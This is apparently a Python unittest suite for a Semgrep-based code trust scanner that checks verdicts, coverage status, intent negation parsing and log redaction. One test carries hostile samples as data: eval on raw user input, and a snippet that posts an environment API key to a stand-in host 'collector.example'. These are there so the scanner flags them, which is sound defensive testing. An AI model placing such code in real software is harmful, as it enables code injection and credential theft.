import json
import unittest
from unittest.mock import patch
import main
from scan_contract import inspect_source, select_filename

COMPLETE = {'status':'complete','findings':[], 'targets_analyzed':1}
class ScanContractTests(unittest.TestCase):
    def scan(self, code, language='Python', intent='Review the supplied code', engine=None):
        with patch.object(main, 'run_semgrep_scan', return_value=engine or COMPLETE):
            return main.analyze_code_product(intent, code, language=language)

    def test_malformed_comments_docstrings_and_unsupported_are_not_rated(self):
        for code,language in [('def broken(:\n pass','Python'),('# eval exec secrets','Python'),('"documentation"','Python'),('fn main() {}','Rust'),('const value: = ;','TypeScript'),('const = ;','JavaScript'),('// eval fetch password','JavaScript')]:
            with self.subTest(code=code):
                r=self.scan(code,language);self.assertEqual(r['scan_status'],'not-rated');self.assertIsNone(r['trust_score']);self.assertEqual(r['coverage']['lines_analyzed'],0)

    def test_explicit_language_and_unknown_do_not_fall_back_to_python(self):
        self.assertEqual(select_filename('const value: number = 1','TypeScript'),'snippet.ts')
        self.assertEqual(main.infer_code_filename('fn main() {}'),'snippet.unknown')
        r=self.scan('fn main() {}','Rust');self.assertEqual(r['coverage']['language'],'Rust')
        self.assertEqual(select_filename('x=1','Python','bad.js'),'snippet.unknown')

    def test_high_engine_finding_dominates_score_and_verdict(self):
        r=self.scan('print(1)',engine={**COMPLETE,'findings':[{'severity':18,'message':'Engine risk','rule_id':'test','line':1}]})
        self.assertEqual(r['verdict']['id'],'do_not_run');self.assertLessEqual(r['trust_score'],65);self.assertEqual(len(r['engine_findings']),1)

    def test_partial_engine_cannot_produce_clean_action_or_score(self):
        r=self.scan('print(1)',engine={'status':'timeout','findings':[]})
        self.assertEqual(r['scan_status'],'partial');self.assertIsNone(r['trust_score']);self.assertEqual(r['verdict']['id'],'review_first')

    def test_semgrep_parse_errors_and_zero_targets_are_not_complete(self):
        for payload in [{'results':[], 'errors':[{'type':'ParseError'}], 'paths':{'scanned':['snippet.py']}},{'results':[], 'paths':{'scanned':[]}}]:
            completed=type('Completed',(),{'returncode':0,'stdout':json.dumps(payload)})()
            with patch('main.shutil.which',return_value='/usr/bin/semgrep'),patch('main.subprocess.run',return_value=completed):
                r=main.run_semgrep_scan('broken','snippet.py')
            self.assertEqual(r['status'],'partial')

    def test_harmless_cases_remain_without_high_findings(self):
        cases=[('import os\nport = os.environ.get("PORT", "8000")','Read the application port'),('import os\nkey=os.environ["API_KEY"]','Read the API credential for authentication'),('import requests\nrequests.get("https://example.com")','Fetch a public web page'),('import subprocess\nsubprocess.run(["echo","hello"],shell=False)','Run a fixed command without a shell')]
        for code,intent in cases:
            r=self.scan(code,intent=intent);self.assertFalse(any(f['severity']>=18 for f in r['flags']))

    def test_negated_intent_does_not_authorize_access(self):
        for intent in ['Do not send credentials over the network','Never use secrets','Read locally without network access','No API calls']:
            self.assertFalse(main.intent_mentions_any(intent,['network','credentials','secrets','api']))
        self.assertTrue(main.intent_mentions_any('Fetch an API response. Do not execute it.',['api']))

    def test_trailing_without_does_not_negate_other_permitted_behaviors(self):
        intent = "Read local environment configuration, fetch a public status over the network, and run a fixed version command without a shell."
        self.assertTrue(main.intent_mentions_any(intent, ['network']))
        self.assertTrue(main.intent_mentions_any(intent, ['command']))
        self.assertFalse(main.intent_mentions_any(intent, ['shell']))
        for denied in ['Network access is not allowed', 'Do not run commands without validation', 'Without network access, read local files']:
            self.assertFalse(main.intent_mentions_any(denied, ['network','command','commands']))
        code = 'import os\nimport requests\nimport subprocess\nmode=os.getenv("APP_MODE","development")\nrequests.get("https://example.com/status",timeout=5)\nsubprocess.run(["python","--version"],shell=False,check=True)'
        result = self.scan(code, intent=intent)
        self.assertEqual(result['intent_mismatches'], [])
        self.assertFalse(any(f['severity'] >= 18 for f in result['flags']))

    def test_dangerous_flows_remain_high_and_eval_wording_is_precise(self):
        r=self.scan('value=input()\neval(value)',intent='Calculate a value from user input')
        self.assertEqual(r['verdict']['id'],'do_not_run')
        self.assertNotIn('system execution',r['touches'])
        self.assertNotIn('system-level',' '.join(r['intent_mismatches']))
        r=self.scan('import os\nimport requests\nx=os.environ["API_KEY"]\nrequests.post("https://collector.example",json={"secret":x})',intent='Do not transmit credentials')
        self.assertEqual(r['verdict']['id'],'do_not_run')

    def test_logs_do_not_echo_exception_secrets(self):
        with patch('builtins.print') as output:
            main.log_server_issue('Scan failed',ValueError('private code credential'))
        self.assertNotIn('private code',str(output.call_args))

class RepositoryCoverageTests(unittest.TestCase):
    def test_repository_empty_malformed_and_mixed_coverage(self):
        import io, zipfile
        from starlette.requests import Request
        cases=[({'README.md':'hello'},'not-rated'),({'bad.py':'def bad(:'},'not-rated'),({'good.py':'print(1)','bad.py':'def bad(:'},'partial')]
        for files,expected in cases:
            archive=io.BytesIO()
            with zipfile.ZipFile(archive,'w') as z:
                for name,code in files.items(): z.writestr('repo-main/'+name,code)
            access={'plan':'admin','authenticated':True,'user_id':'test-admin','limits':main.get_plan_limits('admin')}
            request=Request({'type':'http','method':'POST','path':'/scan-repo','headers':[],'scheme':'https','server':('test',443),'client':('127.0.0.1',123)})
            with patch.object(main,'get_request_access_context',return_value=access),patch.object(main,'enrich_access_with_admin_metadata',side_effect=lambda x:x),patch.object(main,'enforce_rate_limit'),patch.object(main,'download_repo_zip',return_value=archive.getvalue()):
                response=main.scan_repo(main.RepoScanRequest(intent='Review code',repo_url='https://github.com/example/repo'),request)
            result=json.loads(response.body);self.assertEqual(result['scan_status'],expected);self.assertIsNone(result['trust_score'])
